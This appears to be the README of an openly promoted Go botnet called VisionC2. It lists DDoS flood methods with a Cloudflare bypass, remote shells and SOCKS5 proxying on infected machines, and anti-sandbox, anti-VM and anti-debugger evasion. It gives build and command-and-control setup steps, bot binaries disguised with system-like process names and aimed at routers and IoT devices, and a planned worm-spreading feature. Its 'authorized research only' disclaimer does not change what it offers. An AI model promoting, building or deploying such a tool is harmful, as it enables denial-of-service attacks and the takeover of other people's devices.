
<div align="center">

# ☾℣☽ision - **Advanced Go-Based Botnet**

**DDoS • SOCKS5 Proxying • Remote Shell • Multi-Architecture • TUI View**

![Go](https://img.shields.io/badge/Go-1.23.0+-00ADD8?style=for-the-badge)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-009688?style=for-the-badge)
![License](https://img.shields.io/badge/License-GNU%20GPLv3-yellow?style=for-the-badge)

</div>

![Animation](https://github.com/user-attachments/assets/4475a3a1-b3a5-4bb3-b00a-b30e88210dcd)

---

## ✨ Features

### Bot Capabilities
- **Layer 4 Attacks** — UDP, TCP, SYN, ACK, GRE, and DNS flood methods
- **Layer 7 Attacks** — HTTP/HTTPS/TLS with **HTTP/2 fingerprinting** and **Cloudflare UAM bypass**
- **Remote Execution** — **Interactive per-bot shell** and **fire-and-forget broadcast commands**
- **SOCKS5 Proxy** — Convert any agent into a **high-performance SOCKS5 proxy server** on demand

### CNC & TUI Interface
- **Full-screen TUI** (Terminal User Interface) for Command & Control
- **Real-time dashboard** with bot management and live statistics
- **Visual attack builder** with detailed metrics
- **Single-Agent Control** — fully interactive per-bot shell interface
- **Broadcast Shell Execution** — Powerful filters by **architecture**, **RAM amount**, **bot count**, and more
- **Built-in SOCKS5 Proxy Manager** — One-click start/stop per bot or in bulk operations

### Encryption & Stealth
- **TLS 1.3** with **Perfect Forward Secrecy**
- **HMAC challenge-response** authentication system
- **Multi-layer obfuscation** — RC4 → XOR → byte substitution → MD5
- **Anti-analysis & evasion** — **Sandbox detection** • **VM detection** • **Debugger detection**

---

## 🚀 Quick Start

### 📋 Prerequisites

#### **System Requirements**
- **Operating System**: Linux (recommended), macOS, or Windows (WSL2)
- **Memory**: 2GB+ RAM (4GB+ recommended)
- **Hosting**: 1 VPS + 1 Registered Domain(optional) (for C2 server)

#### **Package Installation**

**Ubuntu/Debian:**
```bash
sudo apt update && sudo apt install -y upx-ucl openssl git wget gcc python3 screen build-essential
```

**CentOS/RHEL/Fedora:**
```bash
sudo yum install -y upx openssl git wget gcc python3 screen make
# or for newer Fedora:
sudo dnf install -y upx openssl git wget gcc python3 screen make
```

---

## ⚙️ Installation & Setup

### **Step 1: Clone Repository**
```bash
git clone https://github.com/Syn2Much/VisionC2.git
cd VisionC2
chmod +x *
```

### **Step 2: Run Interactive Setup**
```bash
python3 setup.py
```

The setup script will:
1. Generate 4096-bit TLS certificates
2. Create encryption keys and magic codes
3. Configure C2 address and ports
4. Cross-compile bot binaries for all architectures
5. Build the CNC server binary

**Output Locations:**
- CNC Server: `./server` (in VisionC2 root directory)
- Bot Binaries: `./VisionC2/bins/`
- Configuration: `setup_config.txt`

---

## 📁 File Structure

```
VisionC2/
├── server                  # Compiled CNC server
├── setup.py               # Interactive setup script
├── setup_config.txt       # Generated configuration
├── users.json            # User database (Telnet mode)
├── cnc/certificates/                # TLS certificates
│   ├── server.crt
│   └── server.key
├── bins/                 # Compiled bot binaries
│   ├── kworkerd0        # x86 Linux
│   ├── ethd0           # x86_64 Linux
│   ├── mdsync1         # ARMv7
│   └── ...
├── bot/                  # Bot source code
│   ├── main.go
│   ├── attacks.go
│   └── ...
└── Docs/                 # Documentation
    ├── USAGE.md
    ├── COMMANDS.md
    └── CHANGELOG.md
```
---

## 🖥️ Running the C2 Server

### **Option 1: TUI Mode (Recommended)**
```bash
# Start in screen session for persistence
screen ./server

# Detach from screen session: Ctrl+A, then D
# Reattach: screen -r 
```

### **Option 2: Telnet/Multi-User Mode**
```bash
# Start with split admin interface
screen ./server --split

# Connect to admin interface
nc your-server-ip 1337
# Login with "spamtec" to access hidden portal
```

[COMMANDS.md](Docs/COMMANDS.md) | **Complete CNC command reference**  

Bot binaries are automatically cross-compiled to `bot/bins/`.

---
## 🧬 Supported Architectures

| Binary Name | Architecture | Target Platforms | Size (approx) |
|-------------|--------------|------------------|---------------|
| `kworkerd0` | x86 (386)    | Linux 32-bit, legacy systems | 2.1 MB |
| `ethd0`     | x86_64       | Linux 64-bit (most servers) | 2.3 MB |
| `mdsync1`   | ARMv7        | Raspberry Pi 2/3, older ARM devices | 2.0 MB |
| `ip6addrd`  | ARM64        | Raspberry Pi 4, Android, AWS Graviton | 2.2 MB |
| `httpd`     | MIPS         | Routers, IoT devices | 2.4 MB |
| `+12 more`  | PPC64, RISC-V, s390x, loong64, etc. | Various embedded systems | 1.8-2.5 MB |

**Stealth Features:**
- All binaries UPX-packed and stripped
- Legitimate-sounding process names
- No external dependencies (statically linked)
- Small memory footprint
---
## 📜 Documentation

| File                    | Description                                      |
|-------------------------|--------------------------------------------------|
| [USAGE.md](Docs/USAGE.md)    | Full setup, deployment, and TUI guide            |
| [COMMANDS.md](Docs/COMMANDS.md) | Complete CNC command reference              |
| [CHANGELOG.md](Docs/CHANGELOG.md) | Version history and breaking changes         |

## 🛣️ Roadmap

**In Progress**
- Finish TUI Updates
- Enhanced daemonization
- Competitor locker / killer module

**Planned**
- Auto-generated DGA fallback domains
- Self-replication & worm-like spreading
- Single-instance port takeover

## ⚠️ Legal Disclaimer

**FOR AUTHORIZED SECURITY RESEARCH AND STRESS TESTING ONLY**

This software is provided strictly for educational, research, and authorized penetration testing purposes. The authors are not responsible for any misuse or legal consequences resulting from its use.

## 📜 License
GNU General Public License v3.0 — see [LICENSE](LICENSE)

<div align="center"> <sub>Maintained with ❤️ by Syn</div> 
